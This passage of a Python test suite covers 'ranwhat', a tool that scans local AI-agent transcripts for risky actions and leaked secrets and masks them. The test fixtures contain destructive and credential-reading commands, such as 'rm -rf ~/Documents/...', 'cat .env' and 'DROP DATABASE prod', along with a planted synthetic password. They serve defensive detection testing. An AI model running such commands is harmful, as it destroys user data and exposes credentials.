                                       "flight recorder\n"), out[:80])

    def test_it_is_said_once(self):
        _, out, _ = self.run_cli(["check"] + self.NOWHERE)
        self.assertEqual(out.count(self.ROOT), 1, out)

    def test_watch_and_clean_exit_2(self):
        rc, out, _ = self.run_cli(["watch"] + self.NOWHERE)
        self.assertEqual(rc, 2)
        self.assertNotAllClear(out)
        self.assertIn("No transcripts found", out)
        rc, out, _ = self.run_cli(["clean", "--no-interactive",
                                   "--root", self.ROOT])
        self.assertEqual(rc, 2)
        self.assertNotAllClear(out)
        self.assertIn("No transcripts found", out)
        self.assertIn(self.ROOT, out)
        # clean searches OpenClaw too, and says where it looked for it
        for hint in ("--root", "CLAUDE_CONFIG_DIR", "--state-dir",
                     "OPENCLAW_STATE_DIR"):
            self.assertIn(hint, " ".join(out.split()))

    def test_clean_apply_with_nothing_to_read_exits_2(self):
        with mock.patch.object(clean, "scan", lambda *a, **k: ({}, 0, [])):
            rc, out, _ = self.run_cli(["clean", "--apply", "--root", self.ROOT])
        self.assertEqual(rc, 2)
        self.assertNotIn("Masked in", out)
        self.assertIn("No transcripts found", out)

    def test_json_keeps_its_shape_and_says_where_on_stderr(self):
        for argv, empty in (
                (["check", "--json"] + self.NOWHERE,
                 {"days": 30, "actions": [], "secrets": []}),
                (["watch", "--json"] + self.NOWHERE, []),
                (["clean", "--json", "--no-interactive", "--root", self.ROOT],
                 {"scanned": 0, "applied": False, "changed": [],
                  "findings": []})):
            rc, out, err = self.run_cli(argv)
            self.assertEqual(rc, 2, argv)
            self.assertEqual(json.loads(out), empty)
            self.assertIn(self.ROOT, err)
            self.assertIn("--root", " ".join(err.split()))
            self.assertIn("No transcripts found", " ".join(err.split()))
            for line in err.rstrip("\n").split("\n"):
                self.assertLessEqual(len(line), term.width(), line)

    def test_a_long_path_on_stderr_is_cut_to_fit(self):
        """An agent pointed at a long path by its own variable: --json's
        line on stderr printed it whole, past the edge of the terminal.
        It is cut in the middle to the line, as the text report cuts it,
        so where it starts and where it ends both still show."""
        deep = os.path.join(self.nowhere, *["a-rather-long-directory-name"] * 4)
        env = {"CODEX_HOME": os.path.join(deep, "codex"),
               "OPENCLAW_STATE_DIR": os.path.join(deep, "openclaw")}
        for width in ("46", "60", "80"):
            env["RANWHAT_WIDTH"] = width
            with mock.patch.dict(os.environ, env):
                limit = term.width()
                for argv in (["check", "--json"], ["watch", "--json"],
                             ["clean", "--json", "--no-interactive"]):
                    for only in ([], ["--source", "codex"]):
                        with self.subTest(width=width, argv=argv + only):
                            rc, _, err = self.run_cli(argv + only
                                                      + ["--root", self.ROOT])
                            said = " ".join(err.split())
                            self.assertEqual(rc, 2)
                            self.assertIn("No transcripts found", said)
                            for line in err.rstrip("\n").split("\n"):
                                self.assertLessEqual(len(line), limit, line)
                            if only:
                                self.assertIn("…", said)
                                self.assertIn("codex (Codex)", said)
                                self.assertIn("--path codex=PATH", said)

    def test_history_older_than_the_window_points_at_days(self):
        old = time.strftime("%Y-%m-%d", time.gmtime(time.time() - 60 * 86400))
        root, st = make_root([tool_use("rm -rf ~/Documents/a", 1, old)],
                             age_days=60)
        rc, out, _ = self.run_cli(["check", "--root", root, "--state-dir", st])
        self.assertEqual(rc, 2)
        self.assertNotAllClear(out)
        self.assertIn("--days", out)
        rc, out, err = self.run_cli(["watch", "--json", "--root", root,
                                     "--state-dir", st])
        self.assertEqual((rc, json.loads(out)), (2, []))
        self.assertIn("--days", err)

    def test_openclaw_alone_is_what_each_section_read(self):
        """With OpenClaw unsearched, clean's section said where it had
        looked for Claude Code instead of "No secrets found". OpenClaw is
        searched now, so each section names what it read, as for any
        other agent read alone."""
        state = make_openclaw("rm -rf ~/Documents/thesis", int(time.time()) - 3600)
        rc, out, _ = self.run_cli(["check", "--root", self.ROOT,
                                   "--state-dir", state])
        self.assertEqual(rc, 0)                  # OpenClaw was read
        self.assertIn("Bulk or recursive deletion", out)
        secrets = " ".join(out.split("  ranwhat clean", 1)[1].split())
        self.assertIn("Read OpenClaw: 1 database", secrets)
        self.assertIn("No secrets found.", secrets)
        self.assertNotIn("not searched", out)

    def test_a_read_that_finds_nothing_is_still_an_all_clear(self):
        rc, out, _ = self.check([tool_use("ls", 1)])
        self.assertEqual(rc, 0)
        self.assertIn("Nothing flagged", out)
        self.assertIn("No secrets found", out)
        root, st = make_root([tool_use("ls", 1)])
        for argv in (["watch", "--root", root, "--state-dir", st],
                     ["watch", "--json", "--root", root, "--state-dir", st],
                     ["clean", "--no-interactive", "--root", root]):
            rc, _, err = self.run_cli(argv)
            self.assertEqual((rc, err), (0, ""), argv)

    def test_every_line_fits(self):
        deep = "/nonexistent/" + "a-rather-long-directory-name/" * 4
        for width in ("46", "60", "80"):
            with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": width}):
                limit = term.width()
                for argv in (["check"], ["watch"], ["clean"]):
                    _, out, _ = self.run_cli(argv + ["--root", deep,
                                                     "--state-dir", deep])
                    for line in out.split("\n"):
                        self.assertLessEqual(len(line), limit, (argv, line))


def shown(path):
    """A path as the reports print it: under ~ when it is in the home
    directory, as a temporary directory is on Windows."""
    return watch._shown_path(path, 4096)


class TheRootIsTheProjectsDirectory(_Base):
    """--root takes the directory the transcripts are in, CLAUDE_CONFIG_DIR
    the one above it, and the hint gave them as one: `check --root
    ~/.claude` read nothing, said to "pass --root PATH or set
    CLAUDE_CONFIG_DIR", and 348 transcripts under it went unread."""

    def config(self):
        """A Claude Code config directory, its transcripts in projects/."""
        projects, st = make_root(ACTION + SECRET)
        config = tempfile.mkdtemp(prefix="check-config-")
        os.rename(projects, os.path.join(config, "projects"))
        return config, os.path.join(config, "projects"), st

    def test_a_config_directory_is_pointed_at_its_projects(self):
        config, projects, st = self.config()
        with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": "400"}):
            for argv in (["check", "--root", config, "--state-dir", st],
                         ["watch", "--root", config, "--state-dir", st],
                         ["clean", "--no-interactive", "--root", config]):
                with self.subTest(argv=argv[0]):
                    rc, out, _ = self.run_cli(argv)
                    said = " ".join(out.split())
                    self.assertEqual(rc, 2)
                    self.assertIn("No transcripts found", said)
                    self.assertIn("--root %s" % shown(projects), said)
                    self.assertIn("CLAUDE_CONFIG_DIR=%s" % shown(config), said)
                    self.assertIn("1 transcript", said)

    def test_json_says_so_on_stderr(self):
        """Whole on a terminal wide enough for them, as the text report
        says them (above); on a narrower one each path is cut to the line,
        as there."""
        config, projects, st = self.config()
        for argv in (["check", "--json", "--root", config, "--state-dir", st],
                     ["watch", "--json", "--root", config, "--state-dir", st],
                     ["clean", "--json", "--no-interactive", "--root", config]):
            with self.subTest(argv=argv[0]), \
                    mock.patch.dict(os.environ, {"RANWHAT_WIDTH": "400"}):
                rc, _, err = self.run_cli(argv)
                said = " ".join(err.split())
                self.assertEqual(rc, 2)
                self.assertIn("--root %s" % shown(projects), said)
                self.assertIn("CLAUDE_CONFIG_DIR=%s" % shown(config), said)
            with self.subTest(argv=argv[0], width=WIDTH):
                rc, _, err = self.run_cli(argv)
                self.assertEqual(rc, 2)
                self.assertIn("--root", err)
                for line in err.rstrip("\n").split("\n"):
                    self.assertLessEqual(len(line), term.width(), line)

    def test_the_suggestion_reads_it(self):
        config, projects, st = self.config()
        rc, out, _ = self.run_cli(["check", "--json", "--root", projects,
                                   "--state-dir", st])
        self.assertEqual(rc, 0)
        self.assertEqual(len(json.loads(out)["actions"]), 1)
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": config}), \
                mock.patch.object(watch, "CLAUDE_PROJECTS", watch.claude_projects()):
            rc, out, _ = self.run_cli(["check", "--json", "--state-dir", st])
        self.assertEqual(rc, 0)
        self.assertEqual(len(json.loads(out)["secrets"]), 1)

    def test_the_hint_says_which_directory_each_takes(self):
        """With nothing under the path at all, the hint still tells --root
        from CLAUDE_CONFIG_DIR."""
        for argv in (["check", "--root", "/nonexistent/ranwhat-root",
                      "--state-dir", "/nonexistent/ranwhat-state"],
                     ["clean", "--no-interactive", "--root",
                      "/nonexistent/ranwhat-root"]):
            with self.subTest(argv=argv[0]):
                _, out, _ = self.run_cli(argv)
                said = " ".join(out.split())
                self.assertIn("--root DIR/projects", said)
                self.assertIn("CLAUDE_CONFIG_DIR=DIR", said)
                self.assertNotIn("--root PATH or", said)
        _, _, err = self.run_cli(["watch", "--json", "--root",
                                  "/nonexistent/ranwhat-root", "--state-dir",
                                  "/nonexistent/ranwhat-state"])
        said = " ".join(err.split())
        self.assertIn("--root DIR/projects", said)
        self.assertIn("CLAUDE_CONFIG_DIR=DIR", said)

    def test_every_line_fits_and_no_em_dash(self):
        config, _projects, st = self.config()
        deep = os.path.join(config, *["a-rather-long-directory-name"] * 4)
        os.makedirs(deep)
        os.rename(os.path.join(config, "projects"), os.path.join(deep, "projects"))
        for width in ("46", "60", "80"):
            with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": width}):
                limit = term.width()
                for argv in (["check", "--state-dir", st], ["watch", "--state-dir", st],
                             ["clean", "--no-interactive"]):
                    _, out, _ = self.run_cli(argv + ["--root", deep])
                    self.assertIn("projects", out)
                    self.assertNotIn("\u2014", out)
                    for line in out.split("\n"):
                        self.assertLessEqual(len(line), limit, (argv, line))


class OpenClawIsSearchedForSecrets(_Base):
    """OpenClaw was the one agent clean never searched: check said so under
    its report ("OpenClaw history is not searched for secrets"), and a
    password read out of its database was printed whole by watch, check
    and their --json wherever a later command typed it. Its databases are
    searched now, read only, as every other agent's database is (design
    3.9's follow-up), and the index knows what they hold.

    Before that, watch's section counted each database as a transcript ("2
    transcript(s) scanned") and clean's said "No secrets found." with a
    live-shaped key in an OpenClaw tool result: an all-clear on history
    nobody searched."""

    PASSWORD = "Vb6nM3qW" "z8Kt2Lp5Rx"
    TYPED = "./deploy.sh prod %s -e 'DROP DATABASE prod '"

    def setUp(self):
        super().setUp()
        self.root, _ = make_root([tool_use("ls", 1)])
        self.state = make_openclaw("cat .env", int(time.time()) - 3600)
        self.db = os.path.join(self.state, "agents", "a1", "agent",
                               "openclaw-agent.sqlite")
        conn = sqlite3.connect(self.db)
        conn.execute("INSERT INTO log VALUES (?, ?, ?)", ("2", json.dumps(
            {"content": [{"type": "tool_result", "content": STRIPE + "\n"
                          + "DB_PASSWORD=" + self.PASSWORD + "\n"}]}),
            int(time.time()) - 3500))
        conn.execute("INSERT INTO log VALUES (?, ?, ?)", ("3", json.dumps(
            {"content": [{"type": "tool_use", "name": "bash", "input": {
                "command": self.TYPED % self.PASSWORD}}]}),
            int(time.time()) - 3400))
        conn.commit()
        conn.close()
        self.argv = ["--root", self.root, "--state-dir", self.state]

    def test_each_section_counts_what_it_read(self):
        rc, out, _ = self.run_cli(["check"] + self.argv)
        self.assertEqual(rc, 0)
        watch_part, clean_part = out.split("  ranwhat clean", 1)
        self.assertIn("Read Claude Code: 1 transcript; OpenClaw: 1 database",
                      " ".join(watch_part.split()))
        self.assertIn("Credential material accessed", watch_part)
        self.assertNotIn("2 transcript", out)
        self.assertIn("Read Claude Code: 1 transcript; OpenClaw: 1 database",
                      " ".join(clean_part.split()))

    def test_what_it_holds_is_found_and_said_to_be_read_only(self):
        _, out, err = self.run_cli(["check"] + self.argv)
        clean_part = " ".join(out.split("  ranwhat clean", 1)[1].split())
        self.assertIn("2 distinct secret(s)", clean_part)
        self.assertIn("agent OpenClaw", clean_part)
        self.assertIn("read only 1 file, not masked (below)", clean_part)
        self.assertIn("OpenClaw, 1 file: OpenClaw keeps this in a database; "
                      "delete the session in OpenClaw.", clean_part)
        self.assertNotIn("not searched", out + err)
        self.assertNotIn("No secrets found", out)

    def test_json_lists_them_and_says_nothing_on_stderr(self):
        rc, out, err = self.run_cli(["check", "--json"] + self.argv)
        self.assertEqual((rc, err), (0, ""))
        doc = json.loads(out)
        self.assertEqual(sorted(doc), ["actions", "days", "secrets"])
        self.assertEqual(len(doc["secrets"]), 2)
        for finding in doc["secrets"]:
            self.assertEqual((finding["sources"], finding["read_only"],
                              finding["files"]),
                             (["openclaw"], [self.db], [self.db]))

    def test_no_report_prints_a_value_found_there(self):
        """The password is typed with nothing beside it that says it is
        one: only what clean found in the database hides it."""
        masked = clean.DISPLAY_MASK % clean._hint(self.PASSWORD)
        for argv in (["check"], ["check", "--json"], ["watch"],
                     ["watch", "--json"]):
            with self.subTest(argv=argv):
                rc, out, err = self.run_cli(argv + self.argv)
                self.assertEqual(rc, 0)
                self.assertNotIn(self.PASSWORD, out + err)
                shown = (out if "--json" not in argv else json.dumps(
                    json.loads(out), ensure_ascii=False))
                self.assertIn(masked + " -e 'DROP DATABASE prod '", shown)

    def test_watch_counts_a_database_as_one(self):
        _, out, _ = self.run_cli(["watch"] + self.argv)
        self.assertIn("Read Claude Code: 1 transcript; OpenClaw: 1 database",
                      " ".join(out.split()))

    def test_clean_reads_it_and_help_says_so(self):
        rc, out, _ = self.run_cli(["clean", "--no-interactive"] + self.argv)
        self.assertEqual(rc, 0)
        said = " ".join(out.split())
        self.assertIn("Read Claude Code: 1 transcript; OpenClaw: 1 database",
                      said)
        self.assertIn("2 distinct secret(s)", said)
        self.assertIn("OpenClaw keeps this in a database", said)
        shown = io.StringIO()
        with contextlib.redirect_stdout(shown), \
                mock.patch.dict(os.environ, {"COLUMNS": "200"}):
            try:
                cli.main(["--help"])
            except SystemExit:
                pass
        self.assertIn("check, watch, clean: OpenClaw state directory",
                      " ".join(shown.getvalue().split()))


class NextSteps(_Base):
    """The tail suggested `scan profile.json`, which fails with "no such
    file" for anyone who has not written one, and nothing in the tool
    writes one. Every step it suggests has to run as printed."""

    def tail(self, rows, cmd="ranwhat", argv=None):
        """check at the default --root and --state-dir, which the tail
        leaves out: they are set to this run's directories."""
        root, st = make_root(rows)
        with mock.patch.object(cli, "invocation", return_value=cmd), \
             mock.patch.object(watch, "CLAUDE_PROJECTS", root), \
             mock.patch.dict(os.environ, {"OPENCLAW_STATE_DIR": st}):
            _, out, _ = self.run_cli(["check"] + list(argv or ()))
        return steps_in(out, cmd), root, st, out

    def test_every_step_runs_for_a_new_user(self):
        steps, root, st, out = self.tail(ACTION + SECRET)
        self.assertNotIn("profile.json", out)
        self.assertIn("ranwhat demo", steps)
        self.assertEqual(len(steps), 3, steps)
        for step in steps:
            with mock.patch("sys.stdin", io.StringIO()), \
                 mock.patch.object(watch, "CLAUDE_PROJECTS", root), \
                 mock.patch.dict(os.environ, {"OPENCLAW_STATE_DIR": st}):
                rc, _, err = self.run_cli(shell_words(step)[1:])
            self.assertEqual(rc, 0, (step, err))

    def test_demo_is_offered_even_with_nothing_found(self):
        steps, _, _, _ = self.tail([tool_use("ls", 1)])
        self.assertEqual(steps, ["ranwhat demo"])

    def test_a_long_command_puts_its_reason_underneath(self):
        # uvx at 60 columns: "check --json" and its reason do not fit on
        # one line, so every reason moves to the line below its command.
        steps, _, _, out = self.tail(ACTION + SECRET, cmd="uvx ranwhat")
        limit = term.width()
        self.assertEqual(steps, ["uvx ranwhat clean", "uvx ranwhat check --json",
                                 "uvx ranwhat demo"])
        lines = self.lines(out.split("  What to do with this", 1)[1])
        for i, line in enumerate(lines):
            self.assertLessEqual(len(line), limit, line)
            if line.startswith("    uvx ranwhat "):
                self.assertEqual(line.strip(), steps.pop(0))
                self.assertTrue(lines[i + 1].startswith("      "), lines[i + 1])


class NextStepsReadWhatCheckRead(_Base):
    """After `check --days 365 --root X`, the tail suggested bare `clean`
    and `watch --json`, which read the default directory over 30 days: the
    review opened on other secrets than the ones just listed, or on none.
    Each step now carries the run's own --days, --root and --state-dir."""

    OLD = time.strftime("%Y-%m-%d", time.gmtime(time.time() - 100 * 86400))

    def run_check(self, root, st, *extra):
        argv = ["check", "--root", root, "--state-dir", st] + list(extra)
        with mock.patch.object(cli, "invocation", return_value="ranwhat"):
            _, out, _ = self.run_cli(argv)
            _, doc, _ = self.run_cli(argv + ["--json"])
        return steps_in(out, "ranwhat"), json.loads(doc), out

    def test_each_step_reads_what_check_read(self):
        # 100 days old: inside --days 365, outside the default 30.
        root, st = make_root(
            [tool_use("rm -rf ~/Documents/archive", 1, self.OLD),
             tool_result(STRIPE + "\n", 2, self.OLD)], age_days=100)
        steps, doc, _ = self.run_check(root, st, "--days", "365")
        self.assertEqual((len(doc["actions"]), len(doc["secrets"])), (1, 1))
        argv = {s.split()[1]: shell_words(s)[1:] for s in steps}
        self.assertEqual(sorted(argv), ["check", "clean", "demo"])
        # Refuse to run a step that would read the default directory.
        for name in ("clean", "check"):
            self.assertIn(root, argv[name], argv[name])
        self.assertIn(st, argv["check"])
        self.assertEqual(argv["demo"], ["demo"])

        _, checked, _ = self.run_cli(argv["check"])
        self.assertEqual(json.loads(checked), doc)
        _, cleaned, _ = self.run_cli(argv["clean"] + ["--json",
                                                      "--no-interactive"])
        self.assertEqual(json.loads(cleaned)["findings"], doc["secrets"])

    def test_only_flags_that_differ_from_the_default_are_carried(self):
        root, st = make_root(ACTION + SECRET)
        steps, _, _ = self.run_check(root, st)
        for step in steps:
            self.assertNotIn("--days", step)
        steps, _, _ = self.run_check(root, st, "--days", "30")
        for step in steps:
            self.assertNotIn("--days", step)

    def test_a_carried_path_is_quoted_for_the_shell(self):
        root, st = make_root(ACTION + SECRET)
        # What no quoting shared by cmd and PowerShell can hold, $ and %,
        # is left out on Windows (cli._quote).
        odd = root + (" it's (R&D) a,b;c" if os.name == "nt" else " it's $HOME")
        os.rename(root, odd)
        steps, doc, _ = self.run_check(odd, st)
        self.assertEqual(len(doc["secrets"]), 1)
        for step in steps[:2]:
            words = shell_words(step)
            self.assertEqual(os.path.expanduser(words[words.index("--root") + 1]),
                             odd)

    def test_a_path_in_home_is_carried_under_tilde(self):
        # Shorter, so it fits; and only what follows ~/ is quoted, since a
        # quoted ~ is not expanded. Neither cmd nor PowerShell reads ~ as
        # home, so there the path is carried whole.
        root, st = make_root(ACTION + SECRET)
        odd = root + " it's here"
        os.rename(root, odd)
        home = os.path.dirname(odd)
        with mock.patch.dict(os.environ, {"HOME": home, "USERPROFILE": home}):
            steps, _, _ = self.run_check(odd, st)
        if os.name == "nt":
            for step in steps[:2]:
                self.assertIn(" --root %s" % cli._quote(odd), step)
            return
        for step in steps[:2]:
            self.assertIn(" --root ~/", step)
            words = shell_words(step)
            word = words[words.index("--root") + 1]
            self.assertTrue(word.startswith("~/"), word)
            self.assertEqual(os.path.join(home, word[2:]), odd)
        # And a real shell reads it back as the path: clean's --root is its
        # last word, so everything after it is that one word.
        clean_step = next(s for s in steps if s.split()[1] == "clean")
        word = clean_step.split(" --root ", 1)[1]
        out = subprocess.run(["sh", "-c", "printf %s " + word],
                             env=dict(os.environ, HOME=home),
                             capture_output=True, text=True, timeout=30)
        self.assertEqual(out.stdout, odd)

    def test_every_line_fits_but_a_suggested_command(self):
        # Each shell continues a line differently, so a command folded to
        # fit pastes into one of them only. Each keeps one line of its
        # own, whatever its length; every other line fits.
        root, st = make_root(ACTION + SECRET)
        for width in ("46", "60", "96"):
            with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": width}):
                limit = term.width()
                steps, _, out = self.run_check(root, st, "--days", "365")
            self.assertEqual(len(steps), 3)
            lines = out.split("\n")
            commands = ["    " + step for step in steps]
            for line in lines:
                if line not in commands:
                    self.assertLessEqual(len(line), limit, (width, line))
            for step in steps:
                self.assertFalse(step.endswith("\\"), (width, step))
            # At 46 the paths do not fit, so each command has its line.
            if width == "46":
                for command in commands:
                    self.assertIn(command, lines)


class WindowsPathsPasteIntoCmdAndPowerShell(unittest.TestCase):
    """On Windows a step's path was quoted by subprocess.list2cmdline,
    which quotes only for a blank: C:\\R&D ran D as a second command in
    cmd, and O'Brien opened a string in PowerShell. Read as either shell
    reads it, each of these is the path, whatever the platform here."""

    PATHS = [r"C:\Users\RUNNER~1\AppData\Local\Temp\check-t-b0po2grd",
             r"C:\Users\Jane Doe\.claude\projects",
             r"C:\Users\O'Brien\.claude\projects",
             r"D:\R&D\agents",
             r"D:\R&D\agents (old)\run;1,2",
             r"C:\Users\a@b\#x\{y}\[z]\^w=v!",
             r"\\server\share\my projects",
             "C:\\Users\\\u017deljko\\\u00fcn\u00efcode"]

    def test_each_is_one_word_both_shells_hand_on(self):
        for path in self.PATHS:
            with self.subTest(path=path):
                word = cli._quote(path, windows=True)
                self.assertEqual(windows_words("ranwhat clean --root " + word),
                                 ["ranwhat", "clean", "--root", path])

    def test_a_path_of_plain_characters_is_left_bare(self):
        for path in (self.PATHS[0], "C:\\", "D:\\x\\\u017deljko"):
            self.assertEqual(cli._quote(path, windows=True), path)

    def test_posix_is_unchanged(self):
        self.assertEqual(cli._quote("/tmp/it's here", windows=False),
                         shlex.quote("/tmp/it's here"))


class OneProgressWording(_Base):
    """check said "reading transcripts 1/4" and clean said "scanning 1/4
    -Users-you-Desktop-app", an internal directory slug. One wording for
    one pass, and no slug."""

    def progress(self, *argv):
        root, st = make_root(ACTION + SECRET)
        err = _FakeTTY()
        with mock.patch.dict(os.environ, {"TERM": "xterm"}), \
             mock.patch("sys.stdin", io.StringIO()):
            rc, out, _ = self.run_cli(list(argv) + ["--root", root,
                                                    "--state-dir", st],
                                      stderr=err)
        self.assertEqual(rc, 0)
        self.assertIn("Stripe live secret key", out)
        return err.getvalue()

    def test_check_and_clean_say_the_same_thing(self):
        secrets = "\r  looking for secrets 1/1\033[K"
        self.assertEqual(self.progress("clean", "--no-interactive"),
                         secrets + "\r\033[K")
        self.assertIn(secrets, self.progress("check"))

    def test_no_slug_reaches_the_terminal(self):
        for argv in (["check"], ["clean", "--no-interactive"]):
            self.assertNotIn("synthetic-proj", self.progress(*argv))

    def test_clean_writes_nothing_off_a_terminal(self):
        root, _ = make_root(SECRET)
        _, out, err = self.run_cli(["clean", "--no-interactive", "--root", root])
        self.assertEqual(err, "")
        self.assertIn("Stripe live secret key", out)


class ProgressFromTheFirstTranscript(_Base):
    """check showed nothing for its first five seconds on a real history,
    while every transcript was read for its actions, and the line came up
    only for the search for secrets after. watch never showed one at all.
    Each pass now has its line from the first transcript, in words of its
    own, so a count going back to 1 reads as the next pass, not a restart,
    and it is gone before anything is printed. watch's first is the index
    of the values clean finds, which on a first run reads every transcript.
    check's is its read for secrets, which the index takes in place of one
    of its own for each transcript in the window."""

    INDEX = "\r  indexing secrets (first run) 1/1\033[K"
    ACTIONS = "\r  checking actions 1/1\033[K"
    SECRETS = "\r  looking for secrets 1/1\033[K"

    def stderr(self, *argv, **env):
        root, st = make_root(ACTION + SECRET)
        err = _FakeTTY()
        with mock.patch.dict(os.environ, dict({"TERM": "xterm"}, **env)), \
             mock.patch("sys.stdin", io.StringIO()):
            rc, out, _ = self.run_cli(list(argv) + ["--root", root,
                                                    "--state-dir", st],
                                      stderr=err)
        self.assertEqual(rc, 0)
        self.assertIn("rm -rf ~/Documents/archive", out)
        return err.getvalue()

    def test_check_counts_secrets_then_actions(self):
        err = self.stderr("check")
        self.assertEqual(err, self.SECRETS + self.ACTIONS + "\r\033[K")
        self.assertNotIn("reading transcripts", err)

    def test_watch_has_a_line_too(self):
        err = self.stderr("watch")
        self.assertEqual(err, self.INDEX + self.ACTIONS + "\r\033[K")

    def test_never_in_json_on_a_pipe_or_a_dumb_terminal(self):
        for argv, env in ((["watch", "--json"], {}), (["check", "--json"], {}),
                          (["watch"], {"TERM": "dumb"}), (["check"], {"TERM": "dumb"})):
            with self.subTest(argv=argv, env=env):
                self.assertEqual(self.stderr(*argv, **env), "")
        root, st = make_root(ACTION + SECRET)
        rc, out, err = self.run_cli(["watch", "--root", root, "--state-dir", st])
        self.assertEqual((rc, err), (0, ""))

    def test_counted_before_each_transcript_is_read(self):
        root, _st = make_root(ACTION)
        second = os.path.join(root, "-tmp-synthetic-proj", "s2.jsonl")
        with open(second, "w", encoding="utf-8") as fh:
            fh.write(json.dumps(tool_use("ls", 3)) + "\n")
        events = []
        real = watch.scan_transcript

        def scanned(path, *a, **k):
            events.append(("read", os.path.basename(path)))
            return real(path, *a, **k)
        with mock.patch.object(watch, "scan_transcript", scanned):
            watch.scan_sources_counted(
                sources=("claude-code",), root=root,
                progress=lambda i, n, path: events.append(
                    ("count", i, n, os.path.basename(path))))
        self.assertEqual([e[0] for e in events], ["count", "read", "count", "read"])
        self.assertEqual([e[1:3] for e in events if e[0] == "count"], [(1, 2), (2, 2)])
        self.assertEqual([e[-1] for e in events[0::2]], [e[-1] for e in events[1::2]])

    def test_fits_ranwhat_width(self):
        s = _FakeTTY()
        with mock.patch.dict(os.environ, {"TERM": "xterm", "RANWHAT_WIDTH": "46"}):
            bar = term.Progress(s)
            bar.update("  " + "x" * 120)
            bar.clear()
        for piece in s.getvalue().replace("\033[K", "").split("\r"):
            self.assertLessEqual(len(piece), 46)


class _BrokenTTY:
    """A terminal that has hung up: every write and flush fails."""

    def isatty(self):
        return True

    def fileno(self):
        raise OSError(5, "Input/output error")

    def write(self, s):
        raise OSError(5, "Input/output error")

    def flush(self):
        raise OSError(5, "Input/output error")


class _FakeTTY(io.StringIO):
    def isatty(self):
        return True


class ProgressNeverCostsTheReport(_Base):

    def test_not_a_tty_writes_nothing(self):
        _, out, err = self.check(ACTION + SECRET)
        self.assertEqual(err, "")
        self.assertIn("Stripe live secret key", out)

    def test_failing_stderr(self):
        rc, out, _ = self.check(SECRET, stderr=_BrokenTTY())
        self.assertEqual(rc, 0)
        self.assertIn("Stripe live secret key", out)
        self.assertIn("These must be rotated.", out)

    def test_closed_stderr(self):
        out = io.StringIO()
        root, st = make_root(SECRET)
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(None):
            rc = cli.main(["check", "--root", root, "--state-dir", st])
        self.assertEqual(rc, 0)
        self.assertIn("Stripe live secret key", out.getvalue())

    def test_progress_writes_and_erases_on_a_tty(self):
        s = _FakeTTY()
        with mock.patch.dict(os.environ, {"TERM": "xterm"}):
            bar = term.Progress(s)
            bar.update("  reading transcripts 1/2")
            bar.clear()
        self.assertEqual(s.getvalue(),
                         "\r  reading transcripts 1/2\033[K\r\033[K")

    def test_dumb_terminal_and_pipes_get_no_escapes(self):
        s = _FakeTTY()
        with mock.patch.dict(os.environ, {"TERM": "dumb"}):
            bar = term.Progress(s)
            bar.update("x")
            bar.clear()
        self.assertEqual(s.getvalue(), "")
        s = io.StringIO()
        bar = term.Progress(s)
        bar.update("x")
        bar.clear()
        self.assertEqual(s.getvalue(), "")

    def test_isatty_raising_disables_progress(self):
        class Closed(io.StringIO):
            def isatty(self):
                raise ValueError("I/O operation on closed file")
        self.assertFalse(term.Progress(Closed()).enabled)


# Standalone output must not move. Records and findings are built by hand so
# a change to a rule's wording elsewhere does not break this.
REC = {"severity": "high", "timestamp": "2026-09-20T10:01:00Z",
       "tool_name": "Bash",
       "hits": [{"title": "Synthetic rule", "evidence": "command synthetic",
                 "why": "Because."}]}
FIND = {"fp": {"fingerprint": "0123456789ab", "label": "Synthetic key",
               "length": 20, "hint": "syn…ey", "files": {"/x/s.jsonl"},
               "origins": {"api/.env"}, "projects": {"/p"}, "count": 2}}
# Wrapped to the terminal: at RANWHAT_WIDTH=60 the old fixed lines ran to 66.
ROTATE = ("  These must be rotated.\n"
          "  They have been written to disk in plaintext and sat in a\n"
          "  model context you do not control. Masking them here\n"
          "  stops them leaking again. It does not make them safe.\n")
# One line where it fits; at 60 it did not, by one column, so a line each.
ADVICE = ("  Run with --apply to mask them.", "  Backups are written first.")
WATCH_PLAIN = (
    "\n  ranwhat watch  · local agent flight recorder\n" + RULE + "\n"
    "  1 transcript(s) scanned, last 30 days\n\n  1 high\n\n"
    "  * Synthetic rule   2026-09-20 10:01:00  Bash\n"
    "      command synthetic\n      -> Because.\n\n"
    + RULE + "\n" + FOOTER + "\n")
CLEAN_PLAIN = (
    "\n  ranwhat clean  · secrets sitting in local transcripts\n" + RULE + "\n"
    "  1 transcript(s) scanned\n\n  1 distinct secret(s) in 2 place(s)\n\n"
    + ROTATE + "\n"
    "  * Synthetic key   syn…ey  20 chars  seen 2x\n"
    "      read from api/.env\n      in         /p\n\n"
    "  Dry run. Nothing was changed.\n" + "\n".join(ADVICE) + "\n\n"
    + RULE + "\n" + FOOTER + "\n")


def _sgr(code, s):
    return "\033[%sm%s\033[0m" % (code, s)


B = lambda s: _sgr("1", s)
D = lambda s: _sgr("2", s)
WATCH_COLOUR = (
    "\n" + B("  ranwhat watch  ") + D("· local agent flight recorder") + "\n"
    + D(RULE) + "\n  1 transcript(s) scanned, last 30 days\n\n  "
    + _sgr("33", B("1 high"))
    + "\n\n  " + _sgr("33", "* ") + B("Synthetic rule")
    + D("   2026-09-20 10:01:00  Bash") + "\n" + D("      command synthetic")
    + "\n" + D("      -> Because.") + "\n\n" + D(RULE) + "\n" + D(FOOTER) + "\n")
CLEAN_COLOUR = (
    "\n" + B("  ranwhat clean  ") + D("· secrets sitting in local transcripts")
    + "\n" + D(RULE) + "\n  1 transcript(s) scanned\n\n  "
    + _sgr("31", B("1 distinct secret(s)")) + D(" in 2 place(s)") + "\n\n  "
    + B("These must be rotated.") + "\n"
    + "".join(D(l) + "\n" for l in ROTATE.split("\n")[1:-1]) + "\n  "
    + _sgr("31", "* ") + B("Synthetic key") + D("   syn…ey  20 chars  seen 2x")
    + "\n" + D("      read from ") + _sgr("36", "api/.env") + "\n"
    + D("      in         /p") + "\n\n  " + _sgr("33", "Dry run. Nothing was changed.")
    + "\n" + "\n".join(D(l) for l in ADVICE)
    + "\n\n" + D(RULE) + "\n" + D(FOOTER) + "\n")


class StandaloneUnchanged(_Base):

    @PINNED_ZONE
    def test_plain(self):
        self.assertEqual(watch.render([REC], 1, 30), WATCH_PLAIN)
        self.assertEqual(clean.render(FIND, 1, [], False), CLEAN_PLAIN)

    def test_one_footer_each(self):
